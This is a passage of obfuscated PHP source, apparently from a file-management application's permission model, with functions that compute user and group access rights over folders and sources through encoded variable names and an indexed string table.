array($Ä Ï™ÜŒ[586] => array($Ä Ï™ÜŒ[546], $á’¸¢¼ı[$Ä Ï™ÜŒ[523]] . $éİ¹ƒ¡Õ . $Ä Ï™ÜŒ[547])); $ßÇîÅ€ß = Model($Ä Ï™ÜŒ[1305])->field($Ä Ï™ÜŒ[420])->where($‹ØŞ¥•Ê)->getField($Ä Ï™ÜŒ[405], !0); $ßÇîÅ€ß[] = $éİ¹ƒ¡Õ; } $this->where(array($Ä Ï™ÜŒ[420] => array($Ä Ï™ÜŒ[421], $ßÇîÅ€ß)))->delete(); return !0; } public function getAllChildren($óÔÇÎ©ù) { $‚¤ı£× =& $_SERVER[ë¦»ºéÌ]; $¢åöĞã’ = Model($‚¤ı£×[1305])->sourceInfo($óÔÇÎ©ù); if ($¢åöĞã’[$‚¤ı£×[413]] != $‚¤ı£×[99]) { return $this->sourceListAuth(array($óÔÇÎ©ù)); } if ($¢åöĞã’[$‚¤ı£×[414]] != SourceModel::TYPE_GROUP) { return array(); } $ÉÅ»ë»× = 1; $Ì”Í–Ç = array($óÔÇÎ©ù); if ($¢åöĞã’[$‚¤ı£×[500]] == $‚¤ı£×[202] && $¢åöĞã’[$‚¤ı£×[506]] != $ÉÅ»ë»×) { $Ì”Í–Ç = $this->groupChidldAllRootSource($¢åöĞã’[$‚¤ı£×[506]]); } $±²Õ’Í¼ = $this->field($‚¤ı£×[405])->group($‚¤ı£×[405])->select(); $±²Õ’Í¼ = array_to_keyvalue($±²Õ’Í¼, $‚¤ı£×[12], $‚¤ı£×[405]); if (!$±²Õ’Í¼) { return array(); } $î­±İÚ = $‚¤ı£×[1974]; $×ªßáÒ¢ = array($‚¤ı£×[405] => array($‚¤ı£×[7], $±²Õ’Í¼), $‚¤ı£×[433] => $‚¤ı£×[202]); $¸Ó¬¯İø = Model($‚¤ı£×[809])->field($î­±İÚ)->where($×ªßáÒ¢)->select(); $üµÑ‹¸ç = array($óÔÇÎ©ù); foreach ($¸Ó¬¯İø as $Û×³íÂŒ) { foreach ($Ì”Í–Ç as $¦Á…éàç) { $»Ç¡± = $‚¤ı£×[60] . $¦Á…éàç . $‚¤ı£×[60]; $—­¥í™Ù = $Û×³íÂŒ[$‚¤ı£×[523]] . $Û×³íÂŒ[$‚¤ı£×[405]] . $‚¤ı£×[60]; if (strstr($—­¥í™Ù, $»Ç¡±)) { $üµÑ‹¸ç[] = $Û×³íÂŒ[$‚¤ı£×[405]]; break; } } } return $this->sourceListAuth($üµÑ‹¸ç); } private function sourceListAuth($³öğÆ) { $œ»œ¥É« =& $_SERVER[ë¦»ºéÌ]; $ïÛ“Ç½¨ = Model($œ»œ¥É«[1305])->sourceListInfo($³öğÆ, !0); $ÅÕá÷¸ = $this->sourceAuthSelect($³öğÆ); $ÉÄ®’ = array(); $Œ­Àù = array(); foreach ($ïÛ“Ç½¨ as $·©èÓ©Ó) { unset($·©èÓ©Ó[$œ»œ¥É«[456]]); unset($·©èÓ©Ó[$œ»œ¥É«[454]]); unset($·©èÓ©Ó[$œ»œ¥É«[416]]); unset($·©èÓ©Ó[$œ»œ¥É«[97]]); $„Ú°úÜÀ = $ÅÕá÷¸[$·©èÓ©Ó[$œ»œ¥É«[405]]]; if (!$„Ú°úÜÀ) { continue; } $·©èÓ©Ó[$œ»œ¥É«[1975]] = $this->authTargetInfo($„Ú°úÜÀ); $·©èÓ©Ó[$œ»œ¥É«[521]] = rtrim($·©èÓ©Ó[$œ»œ¥É«[527]], $œ»œ¥É«[8]) . $œ»œ¥É«[8] . ltrim($·©èÓ©Ó[$œ»œ¥É«[521]], $œ»œ¥É«[8]); $ÉÄ®’[] = $·©èÓ©Ó; $©îÊôµ’ = count(explode($œ»œ¥É«[8], trim($·©èÓ©Ó[$œ»œ¥É«[521]], $œ»œ¥É«[8]))); $Œ­Àù[] = $©îÊôµ’ + ($·©èÓ©Ó[$œ»œ¥É«[43]] == $œ»œ¥É«[89] ? 0 : 1000); } array_multisort($Œ­Àù, SORT_ASC, $ÉÄ®’); return $ÉÄ®’; } private function groupChidldAllRootSource($‡ù€¤ÓÔ) { $ÚÒª»Š™ =& $_SERVER[ë¦»ºéÌ]; $ªİ”ƒÄ¡ = Model($ÚÒª»Š™[1976])->groupChildrenAll($‡ù€¤ÓÔ); $æÀü™è• = array($ÚÒª»Š™[500] => 0, $ÚÒª»Š™[506] => array($ÚÒª»Š™[7], $ªİ”ƒÄ¡), $ÚÒª»Š™[414] => SourceModel::TYPE_GROUP); $Õæ¬¼‚ = Model($ÚÒª»Š™[809])->field($ÚÒª»Š™[405])->where($æÀü™è•)->select(); $Õæ¬¼‚ = array_to_keyvalue($Õæ¬¼‚, $ÚÒª»Š™[12], $ÚÒª»Š™[405]); return $Õæ¬¼‚; } private function authTargetInfo($”ı¸ì) { $Ôö½ï¸É =& $_SERVER[ë¦»ºéÌ]; $Ç¶´©À³ = array(); $«¸ï®Ï» = array(); $ÄùÛ»éö = 2 << 25; foreach ($”ı¸ì as $ÆÓá´Ãá) { $Ùµ£öÁÙ = Model($Ôö½ï¸É[509])->listData($ÆÓá´Ãá[$Ôö½ï¸É[1901]]); if (!$Ùµ£öÁÙ) { continue; } if ($ÆÓá´Ãá[$Ôö½ï¸É[414]] == SourceModel::TYPE_USER) { $…Ò®÷ = Model($Ôö½ï¸É[515])->getInfoSimpleOuter($ÆÓá´Ãá[$Ôö½ï¸É[506]]); if ($…Ò®÷[$Ôö½ï¸É[1632]] == $Ôö½ï¸É[1168]) { continue; } if ($…Ò®÷[$Ôö½ï¸É[1632]] == $Ôö½ï¸É[202]) { $…Ò®÷[$Ôö½ï¸É[42]] = LNG($Ôö½ï¸É[1977]); } } else { $…Ò®÷ = Model($Ôö½ï¸É[524])->getInfoSimple($ÆÓá´Ãá[$Ôö½ï¸É[506]]); } if (!$…Ò®÷) { continue; } $…Ò®÷[$Ôö½ï¸É[468]] = $Ùµ£öÁÙ; $Ç¶´©À³[] = $…Ò®÷; $´…ãæ = 0; if ($ÆÓá´Ãá[$Ôö½ï¸É[414]] == SourceModel::TYPE_GROUP) { $´…ãæ = $ÄùÛ»éö * 2; } if ($ÆÓá´Ãá[$Ôö½ï¸É[414]] == SourceModel::TYPE_USER) { $´…ãæ = $ÄùÛ»éö; } if ($ÆÓá´Ãá[$Ôö½ï¸É[414]] == SourceModel::TYPE_USER && $ÆÓá´Ãá[$Ôö½ï¸É[506]] == $Ôö½ï¸É[202]) { $´…ãæ = 0; } $«¸ï®Ï»[] = $Ùµ£öÁÙ[$Ôö½ï¸É[416]] + $´…ãæ; } array_multisort($«¸ï®Ï», SORT_DESC, $Ç¶´©À³); return $Ç¶´©À³; } public function getAllChildrenByUser($¶şš×ÂÌ, $ÂÊ¥òîê) { $ç»´ªºÓ =& $_SERVER[ë¦»ºéÌ]; $ˆû«æ¶ò = Model($ç»´ªºÓ[540])->getInfo($ÂÊ¥òîê); if (!$ÂÊ¥òîê || !$¶şš×ÂÌ || !$ˆû«æ¶ò) { return array(); } $ò©ŠÑõõ = Model($ç»´ªºÓ[1305])->sourceInfo($¶şš×ÂÌ); $“ÖÁ¨ÎŸ = array(); $º£ò€Š = 1; if ($ò©ŠÑõõ[$ç»´ªºÓ[500]] == $ç»´ªºÓ[202] && $ò©ŠÑõõ[$ç»´ªºÓ[506]] != $º£ò€Š && $this->groupContainUser($ò©ŠÑõõ[$ç»´ªºÓ[506]], $ÂÊ¥òîê)) { foreach ($ˆû«æ¶ò[$ç»´ªºÓ[1978]] as $”„œÄ†€) { $Î‡îöäá = Model($ç»´ªºÓ[524])->getInfo($”„œÄ†€[$ç»´ªºÓ[1800]]); $‘˜¢Øğ“ = Model($ç»´ªºÓ[540])->getInfoSimpleOuter($ÂÊ¥òîê); $‘˜¢Øğ“[$ç»´ªºÓ[468]] = $”„œÄ†€[$ç»´ªºÓ[416]]; if (Model($ç»´ªºÓ[509])->authCheckAction($”„œÄ†€[$ç»´ªºÓ[416]][$ç»´ªºÓ[416]], $ç»´ªºÓ[1820])) { continue; } $ æÁÑô = array($ç»´ªºÓ[42] => $ç»´ªºÓ[1581] . $Î‡îöäá[$ç»´ªºÓ[42]], $ç»´ªºÓ[405] => $Î‡îöäá[$ç»´ªºÓ[97]][$ç»´ªºÓ[405]], $ç»´ªºÓ[88] => KodIO::make($Î‡îöäá[$ç»´ªºÓ[97]][$ç»´ªºÓ[405]]), $ç»´ªºÓ[500] => $ç»´ªºÓ[202], $ç»´ªºÓ[414] => $ç»´ªºÓ[517], $ç»´ªºÓ[43] => $ç»´ªºÓ[550], $ç»´ªºÓ[521] => $Î‡îöäá[$ç»´ªºÓ[528]], $ç»´ªºÓ[1800] => $Î‡îöäá[$ç»´ªºÓ[1800]], $ç»´ªºÓ[525] => $Î‡îöäá[$ç»´ªºÓ[500]], $ç»´ªºÓ[1975] => array($‘˜¢Øğ“)); $“ÖÁ¨ÎŸ[$ æÁÑô[$ç»´ªºÓ[405]]] = $ æÁÑô; } } $È¸õû‹ = array(); $¯¹ïæí = $this->getAllChildren($¶şš×ÂÌ); foreach ($¯¹ïæí as $»ò½¹§) { $’‡åÔŒ» = !1; foreach ($»ò½¹§[$ç»´ªºÓ[1975]] as $¨•ÃÛÕø) { if ($¨•ÃÛÕø[$ç»´ªºÓ[1632]]) { if ($¨•ÃÛÕø[$ç»´ªºÓ[1632]] == $ÂÊ¥òîê) { $’‡åÔŒ» = !0; break; } } if ($¨•ÃÛÕø[$ç»´ªºÓ[1800]]) { if ($this->groupContainUser($¨•ÃÛÕø[$ç»´ªºÓ[1800]], $ÂÊ¥òîê)) { $’‡åÔŒ» = !0; break; } } } if ($’‡åÔŒ») { $È¸õû‹[] = $»ò½¹§; } $ŞèëŸçÂ = $»ò½¹§[$ç»´ªºÓ[405]]; if (isset($“ÖÁ¨ÎŸ[$ŞèëŸçÂ])) { $»ò½¹§[$ç»´ªºÓ[1975]][] = $“ÖÁ¨ÎŸ[$ŞèëŸçÂ][0]; $“ÖÁ¨ÎŸ[$ŞèëŸçÂ] = !1; } } $“ÖÁ¨ÎŸ = array_filter(array_values($“ÖÁ¨ÎŸ)); $È¸õû‹ = array_merge($“ÖÁ¨ÎŸ, $È¸õû‹); return $È¸õû‹; } public function setAllChildrenByUser($–ûÂÚÚ, $¾ªŒš½è, $å•¹ÆÄ•) { $“’Õ½ïØ =& $_SERVER[ë¦»ºéÌ]; $ÎİÎœí = $this->getAllChildrenByUser($–ûÂÚÚ, $¾ªŒš½è); if (!$å•¹ÆÄ• || !$ÎİÎœí) { return !1; } foreach ($ÎİÎœí as $çÕ‚©ÉŸ) { $„èã¦‘† = array(); foreach ($çÕ‚©ÉŸ[$“’Õ½ïØ[1975]] as $“şÂõ) { $×åÜØÁÊ = $“şÂõ[$“’Õ½ïØ[468]]; $«û«Ğ¾Ñ = $“şÂõ[$“’Õ½ïØ[1632]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‘û¼÷ëá = $“şÂõ[$“’Õ½ïØ[1632]] ? $“şÂõ[$“’Õ½ïØ[1632]] : $“şÂõ[$“’Õ½ïØ[1800]]; if ($“şÂõ[$“’Õ½ïØ[1632]] && $“şÂõ[$“’Õ½ïØ[1632]] == $¾ªŒš½è) { continue; } $„èã¦‘†[] = array($“’Õ½ïØ[405] => $çÕ‚©ÉŸ[$“’Õ½ïØ[405]], $“’Õ½ïØ[414] => $«û«Ğ¾Ñ, $“’Õ½ïØ[506] => intval($‘û¼÷ëá), $“’Õ½ïØ[1901] => isset($×åÜØÁÊ[$“’Õ½ïØ[403]]) ? intval($×åÜØÁÊ[$“’Õ½ïØ[403]]) : 0, $“’Õ½ïØ[1955] => isset($×åÜØÁÊ[$“’Õ½ïØ[1955]]) ? intval($×åÜØÁÊ[$“’Õ½ïØ[1955]]) : -1); } $„èã¦‘†[] = array($“’Õ½ïØ[405] => $çÕ‚©ÉŸ[$“’Õ½ïØ[405]], $“’Õ½ïØ[414] => SourceModel::TYPE_USER, $“’Õ½ïØ[506] => intval($¾ªŒš½è), $“’Õ½ïØ[1901] => intval($å•¹ÆÄ•), $“’Õ½ïØ[1955] => -1); $this->where(array($“’Õ½ïØ[420] => $çÕ‚©ÉŸ[$“’Õ½ïØ[405]]))->delete(); $this->addAll($„èã¦‘†); } return !0; } public function get($åØà·û) { $Ğ•äØÍƒ = $this->getSourceList(array($åØà·û), !0); return $Ğ•äØÍƒ[0]; } public function getSourceList($†¶ƒ¾ñ, $À…šªá = false, $Û¥ŠÃ€ª = false) { $­Ó³¹ğŞ =& $_SERVER[ë¦»ºéÌ]; if (!$†¶ƒ¾ñ) { return array(); } $ø÷Ô¤˜¥ = Model($­Ó³¹ğŞ[1305]); if (!$À…šªá && count($†¶ƒ¾ñ) == 1) { $À…šªá = array(); $À…šªá[$†¶ƒ¾ñ[0]] = $ø÷Ô¤˜¥->sourceInfo($†¶ƒ¾ñ[0]); } if (!$À…šªá) { $–ƒÃç¥ß = array($­Ó³¹ğŞ[420] => array($­Ó³¹ğŞ[421], $†¶ƒ¾ñ)); $À…šªá = $ø÷Ô¤˜¥->field($­Ó³¹ğŞ[1979])->where($–ƒÃç¥ß)->select(); $À…šªá = array_to_keyvalue($À…šªá, $­Ó³¹ğŞ[405]); } $€Ÿ¾ì§æ = $†¶ƒ¾ñ; foreach ($À…šªá as $­ºå¥Öæ => $ì°¯ë—) { $¬ñü÷•¯ = $ø÷Ô¤˜¥->parentLevelArray($ì°¯ë—[$­Ó³¹ğŞ[523]]); $€Ÿ¾ì§æ = array_merge($€Ÿ¾ì§æ, array($­ºå¥Öæ), array_reverse($¬ñü÷•¯)); } $€Ÿ¾ì§æ = array_values(array_unique($€Ÿ¾ì§æ)); if (!$€Ÿ¾ì§æ) { return array(); } $ Å°‚‘ô = $this->sourceAuthSelect($€Ÿ¾ì§æ); $‹‘£É‡‘ = array(); foreach ($€Ÿ¾ì§æ as $ŠÎ’‚Ğê) { if (isset($ Å°‚‘ô[$ŠÎ’‚Ğê])) { $‹‘£É‡‘[$ŠÎ’‚Ğê] = $ Å°‚‘ô[$ŠÎ’‚Ğê]; } } $×½¯›©ß = $this->userIsRoot($Û¥ŠÃ€ª); $ÒŠŠ÷¬ = AuthModel::authAll(); $×ÁËä®Ì = array($­Ó³¹ğŞ[417] => $ÒŠŠ÷¬, $­Ó³¹ğŞ[1980] => array($­Ó³¹ğŞ[422] => 0, $­Ó³¹ğŞ[1806] => $ÒŠŠ÷¬, $­Ó³¹ğŞ[423] => LNG($­Ó³¹ğŞ[1981]), $­Ó³¹ğŞ[1822] => $­Ó³¹ğŞ[1982])); $”•¨˜ù = array(); foreach ($À…šªá as $ŠÎ’‚Ğê => $ëäœº±å) { if ($×½¯›©ß) { $”•¨˜ù[$ŠÎ’‚Ğê] = $×ÁËä®Ì; continue; } $”•¨˜ù[$ŠÎ’‚Ğê] = $this->makeSourceAuth($ëäœº±å, $‹‘£É‡‘, $Û¥ŠÃ€ª); } return $”•¨˜ù; } public function authDeepCheck($‘ÙÁàá¸, $Ç’¯¶° = false) { $ôĞ¿«Òå =& $_SERVER[ë¦»ºéÌ]; $Ç’¯¶° = $Ç’¯¶° ? $Ç’¯¶° : USER_ID; $ÈÃ…ÁÒå = $this->makeAuthDeep($Ç’¯¶°); if (!in_array($‘ÙÁàá¸, $ÈÃ…ÁÒå[$ôĞ¿«Òå[1983]])) { return !1; } $Çü“‚¨¦ = array(); foreach ($ÈÃ…ÁÒå[$ôĞ¿«Òå[1984]] as $€Ôñªç¡ => $÷øˆŠé§) { if (!in_array($‘ÙÁàá¸, $÷øˆŠé§)) { continue; } $Çü“‚¨¦[] = $€Ôñªç¡; } if (!$Çü“‚¨¦) { return !1; } $¿Ú ­ÌÁ = $Çü“‚¨¦ ? $Çü“‚¨¦[0] : $‘ÙÁàá¸; return array($ôĞ¿«Òå[417] => -1, $ôĞ¿«Òå[468] => array($ôĞ¿«Òå[422] => $ôĞ¿«Òå[1168], $ôĞ¿«Òå[1806] => $ôĞ¿«Òå[202], $ôĞ¿«Òå[423] => LNG($ôĞ¿«Òå[1985]), $ôĞ¿«Òå[1822] => $ôĞ¿«Òå[1986]), $ôĞ¿«Òå[1987] => LNG($ôĞ¿«Òå[1988]), $ôĞ¿«Òå[1989] => $this->sourceAuthInfo($¿Ú ­ÌÁ)); } protected function makeAuthDeep($áç¯¦æ– = false) { $©¾Æ¬ô =& $_SERVER[ë¦»ºéÌ]; static $Æ©áÍ‹‰ = array(); $áç¯¦æ– = $áç¯¦æ– ? $áç¯¦æ– : USER_ID; if (isset($Æ©áÍ‹‰[$áç¯¦æ–])) { return $Æ©áÍ‹‰[$áç¯¦æ–]; } $ÇÑµ»’¬ = Model($©¾Æ¬ô[1990])->listData(); $ìüÎØ™÷ = array(); foreach ($ÇÑµ»’¬ as $Ò¼½âÄŸ) { if ($Ò¼½âÄŸ[$©¾Æ¬ô[416]] == 0 && $Ò¼½âÄŸ[$©¾Æ¬ô[1821]] == $©¾Æ¬ô[99]) { $ìüÎØ™÷[] = $Ò¼½âÄŸ[$©¾Æ¬ô[403]]; } } $ùÀÉ½æÓ = $this->userGroupParents($áç¯¦æ–); $‘øÑµ¿Ÿ = array($©¾Æ¬ô[414] => SourceModel::TYPE_USER, $©¾Æ¬ô[506] => $áç¯¦æ–); if ($ùÀÉ½æÓ) { $‘øÑµ¿Ÿ = array(array($©¾Æ¬ô[414] => SourceModel::TYPE_USER, $©¾Æ¬ô[506] => $áç¯¦æ–), array($©¾Æ¬ô[414] => SourceModel::TYPE_GROUP, $©¾Æ¬ô[506] => array($©¾Æ¬ô[421], $ùÀÉ½æÓ)), $©¾Æ¬ô[980] => $©¾Æ¬ô[1895]); } $×¸…˜Í† = $this->field($©¾Æ¬ô[1991])->where($‘øÑµ¿Ÿ)->select(); $áŞì¿¤— = array(); $Æ¼Ğµ‹… = array_to_keyvalue_group($×¸…˜Í†, $©¾Æ¬ô[405]); foreach ($Æ¼Ğµ‹… as $®¹ÙÔæ· => $Í°Áº›¶) { $‹İó í = $this->authArrayCheck($Í°Áº›¶, $áç¯¦æ–); if ($‹İó í[$©¾Æ¬ô[417]] > 0) { $áŞì¿¤—[] = $®¹ÙÔæ· . $©¾Æ¬ô[12]; } } if ($ùÀÉ½æÓ) { $ÀáË»İİ = Model($©¾Æ¬ô[524]); foreach ($ùÀÉ½æÓ as $ÃñˆË¬¯) { $®˜É¨£ß = $ÀáË»İİ->getInfo($ÃñˆË¬¯); if (!$®˜É¨£ß || !is_array($®˜É¨£ß[$©¾Æ¬ô[97]])) { continue; } $áŞì¿¤—[] = $®˜É¨£ß[$©¾Æ¬ô[97]][$©¾Æ¬ô[405]]; } } $öİÓñº’ = array(); $ªæŠ›ÎÖ = $ùÀÉ½æÓ; $ùË†ÊÆš = Model($©¾Æ¬ô[1305]); $ÀáË»İİ = Model($©¾Æ¬ô[524]); $¿¢èûÖ = array(); $‘ÀÁºÓ  = array(); $Ö˜É¿¯Ã = array(); $°ˆ“¬£ = array(); if ($áŞì¿¤—) { $ïÌ»˜½ = $ùË†ÊÆš->where(array($©¾Æ¬ô[405] => array($©¾Æ¬ô[421], $áŞì¿¤—)))->select(); foreach ($ïÌ»˜½ as $ş„ñ¿ŠŞ) { $Çæ§÷ª¬ = $ùË†ÊÆš->parentLevelArray($ş„ñ¿ŠŞ[$©¾Æ¬ô[523]]); $öİÓñº’ = array_merge($öİÓñº’, $Çæ§÷ª¬); $ªæŠ›ÎÖ[] = $ş„ñ¿ŠŞ[$©¾Æ¬ô[506]]; $¿¢èûÖ[$ş„ñ¿ŠŞ[$©¾Æ¬ô[405]]] = $Çæ§÷ª¬; $‘ÀÁºÓ [$ş„ñ¿ŠŞ[$©¾Æ¬ô[405]]] = $ş„ñ¿ŠŞ[$©¾Æ¬ô[506]]; } } $ªæŠ›ÎÖ = array_values(array_unique($ªæŠ›ÎÖ)); $÷Š¯Õ‘‰ = $ªæŠ›ÎÖ; foreach ($÷Š¯Õ‘‰ as $ÃñˆË¬¯) { $®˜É¨£ß = $ÀáË»İİ->getInfo($ÃñˆË¬¯); $Çæ§÷ª¬ = $ùË†ÊÆš->parentLevelArray($®˜É¨£ß[$©¾Æ¬ô[523]]); $ªæŠ›ÎÖ = array_merge($ªæŠ›ÎÖ, $Çæ§÷ª¬); } $ªæŠ›ÎÖ = array_values(array_unique($ªæŠ›ÎÖ)); foreach ($ªæŠ›ÎÖ as $ÃñˆË¬¯) { $®˜É¨£ß = $ÀáË»İİ->getInfo($ÃñˆË¬¯); $öİÓñº’[] = $®˜É¨£ß[$©¾Æ¬ô[97]][$©¾Æ¬ô[405]]; $Ö˜É¿¯Ã[$ÃñˆË¬¯] = $®˜É¨£ß[$©¾Æ¬ô[97]][$©¾Æ¬ô[405]]; $°ˆ“¬£[$ÃñˆË¬¯] = $ùË†ÊÆš->parentLevelArray($®˜É¨£ß[$©¾Æ¬ô[523]]); } foreach ($¿¢èûÖ as $†î˜âÃ¬ => $¿£Œ³†) { $µ±ºÇ‚º = $‘ÀÁºÓ [$†î˜âÃ¬]; if (!$µ±ºÇ‚º || !$Ö˜É¿¯Ã[$µ±ºÇ‚º]) { continue; } $İ½½íÒÆ = array(); foreach ($°ˆ“¬£[$µ±ºÇ‚º] as $ÃñˆË¬¯) { $İ½½íÒÆ[] = $Ö˜É¿¯Ã[$ÃñˆË¬¯]; } $¿¢èûÖ[$†î˜âÃ¬] = array_merge($İ½½íÒÆ, $¿£Œ³†); } $öİÓñº’ = array_values(array_unique($öİÓñº’)); $ŸÛì°¶Ê = array($©¾Æ¬ô[1983] => $öİÓñº’, $©¾Æ¬ô[1984] => $¿¢èûÖ); $Æ©áÍ‹‰[$áç¯¦æ–] = $ŸÛì°¶Ê; return $ŸÛì°¶Ê; } private function makeSourceAuth($µÜ„¡°Æ, $ä¥¹—à, $ã¶Ì—Ïê = false) { $ñÒÎ»õÎ =& $_SERVER[ë¦»ºéÌ]; $š§ùÄ’® = $ñÒÎ»õÎ[99]; $ÜñÃû©’ = $µÜ„¡°Æ[$ñÒÎ»õÎ[506]]; $ãÆ„Šè– = $µÜ„¡°Æ[$ñÒÎ»õÎ[414]] == SourceModel::TYPE_GROUP; $âãÂåÁ¹ = $ãÆ„Šè– ? $this->groupRootAuth($ÜñÃû©’, $ã¶Ì—Ïê) : !1; if ($âãÂåÁ¹ && Model($ñÒÎ»õÎ[509])->authCheckAction($âãÂåÁ¹[$ñÒÎ»õÎ[416]], $ñÒÎ»õÎ[1820])) { return $this->groupAuthInfo($âãÂåÁ¹, $ÜñÃû©’); } $óœĞİ€ = Model($ñÒÎ»õÎ[1305])->parentLevelArray($µÜ„¡°Æ[$ñÒÎ»õÎ[523]]); $óœĞİ€ = array_merge(array($µÜ„¡°Æ[$ñÒÎ»õÎ[405]]), array_reverse($óœĞİ€)); $Ë‡Œ÷•† = !1; foreach ($óœĞİ€ as $ÚÅÜ•¬) { if (!isset($ä¥¹—à[$ÚÅÜ•¬])) { continue; } $ÜšË™¼ë = $this->authMake($ä¥¹—à[$ÚÅÜ•¬], $ã¶Ì—Ïê); if ($ÜšË™¼ë[$ñÒÎ»õÎ[468]]) { $Ë‡Œ÷•† = $ÜšË™¼ë; break; } } if (!$ãÆ„Šè–) { return $Ë‡Œ÷•†; } if (!$Ë‡Œ÷•† && $âãÂåÁ¹) { $Ë‡Œ÷•† = $this->groupAuthInfo($âãÂåÁ¹, $ÜñÃû©’); } if (!$Ë‡Œ÷•†) { $î¿Úßá = Model($ñÒÎ»õÎ[524])->getInfo($ÜñÃû©’); $šÚÕ“Í = explode($ñÒÎ»õÎ[60], trim($î¿Úßá[$ñÒÎ»õÎ[523]], $ñÒÎ»õÎ[60])); $šÚÕ“Í = array_reverse($šÚÕ“Í); foreach ($šÚÕ“Í as $ÈÃåÂÒ¼) { if ($ÈÃåÂÒ¼ == $ñÒÎ»õÎ[202] || $ÈÃåÂÒ¼ == $š§ùÄ’®) { continue; } $¯Á…¿ë” = $this->groupRootAuth($ÈÃåÂÒ¼, $ã¶Ì—Ïê); if (!$¯Á…¿ë”) { continue; } $Ë‡Œ÷•† = $this->groupAuthInfo($¯Á…¿ë”, $ÈÃåÂÒ¼); break; } } if (!$Ë‡Œ÷•† || $Ë‡Œ÷•†[$ñÒÎ»õÎ[417]] <= 0) { $í—·Á›Å = $this->authDeepCheck($µÜ„¡°Æ[$ñÒÎ»õÎ[405]], $ã¶Ì—Ïê); if ($í—·Á›Å) { $Ë‡Œ÷•† = $í—·Á›Å; } } return $Ë‡Œ÷•†; } private function userIsRoot($«½û¯ı = false) { $¯Ò¶¼¾ =& $_SERVER[ë¦»ºéÌ]; if (!$«½û¯ı && _get($GLOBALS, $¯Ò¶¼¾[507])) { return !0; } $¸ç·íúÃ = Model($¯Ò¶¼¾[540])->getInfo($«½û¯ı); $¬×è¦‘Ë = Model($¯Ò¶¼¾[1992])->listData($¸ç·íúÃ[$¯Ò¶¼¾[1512]]); if ($¬×è¦‘Ë && $¬×è¦‘Ë[$¯Ò¶¼¾[513]][$¯Ò¶¼¾[1993]] == 1) { return !0; } return !1; } private function sourceAuthInfo($İ‹ã˜åö) { $Œ»–éòÇ =& $_SERVER[ë¦»ºéÌ]; $×ê®œ­ø = Model($Œ»–éòÇ[1305]); $ª’óñ·ù = $×ê®œ­ø->sourceInfo($İ‹ã˜åö); if (!$ª’óñ·ù) { return !1; } $×ê®œ­ø->groupPathDisplay($ª’óñ·ù); $ŒÈ±´±Â = array($ª’óñ·ù); $ŒÈ±´±Â = $×ê®œ­ø->_listAppendPath($ŒÈ±´±Â); $ª’óñ·ù = $ŒÈ±´±Â[0]; $£ë‹˜µ = $ª’óñ·ù[$Œ»–éòÇ[521]]; if (isset($ª’óñ·ù[$Œ»–éòÇ[529]])) { $õÙ“†å = explode($Œ»–éòÇ[8], trim($ª’óñ·ù[$Œ»–éòÇ[521]], $Œ»–éòÇ[8])); array_shift($õÙ“†å); $£ë‹˜µ = $ª’óñ·ù[$Œ»–éòÇ[527]] . $Œ»–éòÇ[1994] . implode($Œ»–éòÇ[8], $õÙ“†å); } return array($Œ»–éòÇ[423] => $ª’óñ·ù[$Œ»–éòÇ[42]], $Œ»–éòÇ[88] => KodIO::make($ª’óñ·ù[$Œ»–éòÇ[405]]), $Œ»–éòÇ[1995] => $£ë‹˜µ); } private function groupAuthInfo($«ıñ‚Ù‹, $³§ÜÇËõ) { $ËŞéªÉ© =& $_SERVER[ë¦»ºéÌ]; $ŠÅó¹¾™ = Model($ËŞéªÉ©[524])->getInfo($³§ÜÇËõ); return array($ËŞéªÉ©[1996] => intval($«ıñ‚Ù‹[$ËŞéªÉ©[416]]), $ËŞéªÉ©[1980] => $«ıñ‚Ù‹, $ËŞéªÉ©[1997] => LNG($ËŞéªÉ©[1998]), $ËŞéªÉ©[1989] => array($ËŞéªÉ©[423] => $ŠÅó¹¾™[$ËŞéªÉ©[42]], $ËŞéªÉ©[88] => KodIO::make($ŠÅó¹¾™[$ËŞéªÉ©[97]][$ËŞéªÉ©[405]]), $ËŞéªÉ©[1995] => $ŠÅó¹¾™[$ËŞéªÉ©[528]])); } protected function groupRootAuth($¨€İ·œš, $¿ø•½× = false) { $¼îû¦šï =& $_SERVER[ë¦»ºéÌ]; $¿ø•½× = $¿ø•½× ? $¿ø•½× : USER_ID; $™û–ú¸Ã = $¿ø•½× . $¼îû¦šï[1999] . $¨€İ·œš; static $ñç®Ÿ¢¼ = array(); if (isset($ñç®Ÿ¢¼[$™û–ú¸Ã])) { return $ñç®Ÿ¢¼[$™û–ú¸Ã]; } $ªª½æòŒ = Model($¼îû¦šï[524])->getInfo($¨€İ·œš); $Õ÷ŠôÊ‹ = $this->userGroupList($¿ø•½×); $ÓÕôø¼Ø = isset($Õ÷ŠôÊ‹[$¨€İ·œš]) ? $Õ÷ŠôÊ‹[$¨€İ·œš][$¼îû¦šï[416]] : !1; if ($ÓÕôø¼Ø && Model($¼îû¦šï[509])->authCheckAction($ÓÕôø¼Ø[$¼îû¦šï[416]], $¼îû¦šï[1820])) { $ñç®Ÿ¢¼[$™û–ú¸Ã] = $ÓÕôø¼Ø; return $ÓÕôø¼Ø; } $„Â°ƒ´‰ = $this->sourceAuthSelect($ªª½æòŒ[$¼îû¦šï[97]][$¼îû¦šï[405]]); $¸ó½¯Ü = $„Â°ƒ´‰ ? $this->authMake($„Â°ƒ´‰, $¿ø•½×) : !1; $½£ì£” = $¸ó½¯Ü ? $¸ó½¯Ü[$¼îû¦šï[468]] : !1; $ñç®Ÿ¢¼[$™û–ú¸Ã] = $½£ì£” ? $½£ì£” : $ÓÕôø¼Ø; return $ñç®Ÿ¢¼[$™û–ú¸Ã]; } public function authOwnerApply($Ï®óµ¡×) { $õ¿³”¡Ÿ =& $_SERVER[ë¦»ºéÌ]; if (empty($Ï®óµ¡×[$õ¿³”¡Ÿ[416]]) || isset($Ï®óµ¡×[$õ¿³”¡Ÿ[2000]]) && $Ï®óµ¡×[$õ¿³”¡Ÿ[2000]]) { return $Ï®óµ¡×; } if (AuthModel::authCheckRoot($Ï®óµ¡×[$õ¿³”¡Ÿ[416]][$õ¿³”¡Ÿ[417]])) { return $Ï®óµ¡×; } $Í×Ë°³µ = Model($õ¿³”¡Ÿ[1305])->parentLevelArray($Ï®óµ¡×[$õ¿³”¡Ÿ[523]]); $Í×Ë°³µ = array_merge(array($Ï®óµ¡×[$õ¿³”¡Ÿ[405]]), array_reverse($Í×Ë°³µ)); $´ÃÀ…õ = $this->sourceAuthSelect($Í×Ë°³µ); $˜ÃÕ»ò = array(); $®¾ä¬ƒ— = array(); foreach ($´ÃÀ…õ as $™½ĞÚõ => $ÌĞ¢ü•) { 